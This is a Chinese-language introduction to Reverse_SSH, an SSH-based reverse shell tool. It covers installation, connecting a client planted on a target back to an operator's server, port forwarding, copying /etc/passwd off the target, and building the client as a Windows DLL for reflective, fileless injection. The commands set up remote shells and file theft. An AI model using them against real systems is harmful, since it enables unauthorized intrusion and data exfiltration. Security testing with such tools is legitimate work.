![](https://image.3001.net/images/20221120/1668946873_637a1bb952fc51f32d07e.jpg!small)

## 关于Reverse_SSH

Reverse_SSH上一款基于SSH的反向Shell工具，在该工具的帮助下，广大研究人员可以使用SSH来实现反向Shell，并同时拥有下列功能：

> 1、使用原生SSH语句管理和连接反向Shell；
>
> 2、动态、本地和远程转发；
>
> 3、原生SCP和SFTP实现，用于从目标获取文件；
>
> 4、完整功能的Windows Shell；
>
> 5、实现了客户端&服务器端身份验证，以创建高信任高可用的控制通道；
>
> 6、其他...

## 工具架构

![](https://image.3001.net/images/20221120/1668946887_637a1bc772efc51b78b6e.png!small)

## 工具安装

### Docker安装

    
    
    docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your_external_address>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reversessh/reverse_ssh

### 手动安装

    
    
    git clone https://github.com/NHAS/reverse_ssh
    
    cd reverse_ssh
    
    make
    
    cd bin/

运行下列命令后即可启动服务器：

    
    
    cp ~/.ssh/id_ed25519.pub authorized_keys
    
    ./server 0.0.0.0:3232

## 工具运行

将客户端拷贝到目标设备中，然后让客户端连接服务器：

    
    
    ./client your.rssh.server.com:3232

获取工具帮助信息：

    
    
    ssh your.rssh.server.com -p 3232 help

查看客户端：

    
    
    ssh your.rssh.server.com -p 3232 ls -t

![](https://image.3001.net/images/20221120/1668946927_637a1befdba48a156ecdc.png!small)

连接到完整Shell：

    
    
    ssh -J your.rssh.server.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac

或直接使用主机名连接：

    
    
    ssh -J your.rssh.server.com:3232 root.wombo

接下来，可以开启远程转发功能：

    
    
    ssh -R 1234:localhost:1234 -J your.rssh.server.com:3232 root.wombo

或开启动态转发：

    
    
    ssh -D 9050 -J your.rssh.server.com:3232 root.wombo

SCP：

    
    
    scp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .

SFTP：

    
    
    sftp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .

## 其他功能

### 默认服务器

可以在项目构建的时候指定一个默认服务器：

    
    
    $ RSSH_HOMESERVER=your.rssh.server.com:3232 make
    
    $ bin/client
    
    $ bin/client example.com:3232

### Windows DLL生成

我们还可以将客户端编译成DLL，并使用类似Invoke-ReflectivePEInjection之类的工具进行加载。此时，如果你使用的是Linux系统，可以使用mingw-w64-gcc编译器：

    
    
    CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll

当RSSH服务器启用了Webserver之后，我们也可以使用下列命令进行编译：

    
    
    ./server --webserver :3232
    
    ssh your.rssh.server.com -p 3232
    
    catcher$ link --name windows_dll --shared-object --goos windows
    
    http://your.rssh.server.com:3232/windows_dll

这种情况适用于无文件注入的场景。

### Webhook

RSSH服务器可以通过命令行终端接口并使用webhook命令发送原始HTTP请求。

首先，启用一个webhook：

    
    
    $ ssh your.rssh.server.com -p 3232
    
    catcher$ webhook --on http://localhost:8080/

接下来，连接客户端，并使用下列格式发送一个POST请求：

    
    
    $ nc -l -p 8080
    
    POST /rssh_webhook HTTP/1.1
    
    Host: localhost:8080
    
    User-Agent: Go-http-client/1.1
    
    Content-Length: 165
    
    Content-Type: application/json
    
    Accept-Encoding: gzip
    
     
    
    {"Status":"connected","ID":"ae92b6535a30566cbae122ebb2a5e754dd58f0ca","IP":"[::1]:52608","HostName":"user.computer","Timestamp":"2022-06-12T12:23:40.626775318+12:00"}%  

## 项目地址

 **Reverse_SSH** ：【[ _GitHub传送门_](https://github.com/NHAS/reverse_ssh)】

## 参考资料

> [
> _https://www.instagram.com/smart.hedgehog.art/﻿_](https://www.instagram.com/smart.hedgehog.art/)

